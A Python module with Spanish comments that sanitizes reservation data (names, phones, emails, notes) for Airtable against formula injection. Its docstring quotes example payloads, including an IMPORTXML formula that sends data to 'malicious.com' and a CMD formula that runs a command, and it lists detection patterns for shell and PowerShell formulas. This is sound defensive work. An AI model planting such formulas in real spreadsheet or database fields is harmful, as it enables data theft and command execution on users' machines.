"""
Utilidades de sanitización para prevenir ataques de Formula Injection en Airtable.

Los campos de texto en Airtable pueden interpretarse como fórmulas si comienzan con:
=, +, -, @, o caracteres de control.

Esto permite ataques como:
- =IMPORTXML("http://malicious.com/", "//a")  (exfiltración de datos)
- =CMD|'/c calc.exe'!A1                     (ejecución de comandos)

Referencias:
- https://owasp.org/www-community/attacks/CSV_Injection
- https://airtable.com/developer/web/api/field-types
"""
import re
import logging

logger = logging.getLogger(__name__)

# Caracteres peligrosos que inician fórmulas en spreadsheets
DANGEROUS_PREFIXES = ('=', '+', '-', '@', '\t', '\r', '\n')

# Patrones de fórmulas maliciosas comunes
MALICIOUS_PATTERNS = [
    r'^=\s*IMPORT',           # IMPORTXML, IMPORTDATA, etc.
    r'^=\s*WEBSERVICE',       # WEBSERVICE
    r'^=\s*SHELL',            # Shell execution
    r'^=\s*CMD',              # Windows CMD
    r'^=\s*POWER',            # PowerShell
    r'^=\s*HYPERLINK',        # HYPERLINK con URLs maliciosas
    r'^@',                    # At-mentions
    r'^\+.*[!\$]',            # Referencias externas
    r'^-.*[!\$]',             # Referencias externas negativas
]

# Patrón de teléfono E.164 válido
E164_PATTERN = re.compile(r'^\+\d{10,15}$')


def sanitize_for_airtable(value: str, field_type: str = 'text') -> str:
    """
    Sanitiza un valor para prevenir formula injection en Airtable.
    
    Args:
        value: El valor a sanitizar
        field_type: Tipo de campo ('text', 'phone', 'email', 'name')
    
    Returns:
        Valor sanitizado seguro para Airtable
    """
    if not isinstance(value, str):
        return str(value)
    
    value = value.strip()
    
    if not value:
        return value
    
    # Estrategia: Agregar apóstrofo al inicio si comienza con caracter peligroso
    if value.startswith(DANGEROUS_PREFIXES):
        # Verificar si parece una fórmula maliciosa
        upper_value = value.upper()
        for pattern in MALICIOUS_PATTERNS:
            if re.match(pattern, upper_value):
                logger.warning(f"🚫 Patrón malicioso detectado y neutralizado: {value[:30]}...")
                # Neutralizar reemplazando el carácter inicial
                return "'" + value
        
        # Para valores legítimos que comienzan con estos caracteres
        # (como teléfonos que empiezan con +), agregar apóstrofo
        return "'" + value
    
    return value


def sanitize_phone_number(phone: str) -> str:
    """
    Sanitiza y valida un número de teléfono para Airtable.
    
    Args:
        phone: Número de teléfono en cualquier formato
    
    Returns:
        Número sanitizado en formato seguro
    
    Raises:
        ValueError: Si el formato es inválido
    """
    if not phone:
        return ''
    
    # Eliminar espacios y caracteres no numéricos excepto +
    cleaned = re.sub(r'[^+\d]', '', phone)
    
    # Validar formato básico
    if not cleaned.startswith('+'):
        # Si no tiene código de país, asumir España (+34)
        cleaned = '+34' + cleaned.lstrip('0')
    
    # Validar longitud (E.164: + y 10-15 dígitos)
    if not E164_PATTERN.match(cleaned):
        raise ValueError(f"Formato de teléfono inválido: {phone}")
    
    # Sanitizar para prevenir formula injection
    # El + al inicio podría interpretarse como operador matemático
    return sanitize_for_airtable(cleaned, 'phone')


def sanitize_email(email: str) -> str:
    """
    Sanitiza y valida un email para Airtable.
    
    Args:
        email: Dirección de email
    
    Returns:
        Email sanitizado
    
    Raises:
        ValueError: Si el formato es inválido
    """
    if not email:
        return ''
    
    email = email.strip().lower()
    
    # Validar formato básico de email
    email_pattern = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')
    if not email_pattern.match(email):
        raise ValueError(f"Formato de email inválido: {email}")
    
    return sanitize_for_airtable(email, 'email')


def sanitize_reservation_data(data: dict) -> dict:
    """
    Sanitiza todos los campos de una reserva antes de enviar a Airtable.
    
    Args:
        data: Diccionario con datos de la reserva
    
    Returns:
        Diccionario con valores sanitizados
    """
    sanitized = {}
    
    field_sanitizers = {
        'nombre': lambda x: sanitize_for_airtable(x, 'name'),
        'telefono': sanitize_phone_number,
        'email': sanitize_email,
        'notas': lambda x: sanitize_for_airtable(x, 'text'),
        'mesa': lambda x: sanitize_for_airtable(x, 'text'),
        'estado': lambda x: x.strip() if x else '',
    }
    
    for key, value in data.items():
        if key in field_sanitizers and value:
            try:
                sanitized[key] = field_sanitizers[key](value)
            except ValueError as e:
                logger.error(f"❌ Error sanitizando campo {key}: {e}")
                raise
        else:
            sanitized[key] = value
    
    return sanitized


def is_potentially_malicious(value: str) -> bool:
    """
    Detecta si un valor potencialmente contiene una fórmula maliciosa.
    
    Args:
        value: Valor a verificar
    
    Returns:
        True si parece malicioso, False en caso contrario
    """
    if not isinstance(value, str):
        return False
    
    value = value.strip().upper()
    
    if not value.startswith(DANGEROUS_PREFIXES):
        return False
    
    for pattern in MALICIOUS_PATTERNS:
        if re.match(pattern, value):
            return True
    
    return False
